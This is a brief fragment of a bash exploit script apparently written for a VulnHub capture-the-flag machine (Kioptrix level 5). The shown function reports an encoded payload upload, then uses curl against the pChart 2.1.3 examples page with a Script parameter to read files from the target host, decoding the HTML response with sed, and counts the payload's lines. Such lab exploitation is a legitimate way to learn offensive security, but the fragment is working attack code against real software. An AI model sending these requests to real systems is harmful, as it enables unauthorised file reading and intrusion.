...
function write(){
 ...
 done < /home/operador/Documents/CTF/vulnhub/kioptix_l5/payload/encode
 echo "[-] Upload Done"
 curl -qs "http://172.16.0.101/pChart2.1.3/examples/index.php?Action=View&Script=$FILE" | sed 's/<br \/>/\n/g' | sed 's/&amp;//g' | sed 's/&nbsp\;/ \& /g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | grep -vE "span|code"
 payload_size=`wc -l /home/operador/Documents/CTF/vulnhub/kioptix_l5/payload/encode | cut -d ' ' -f 1`
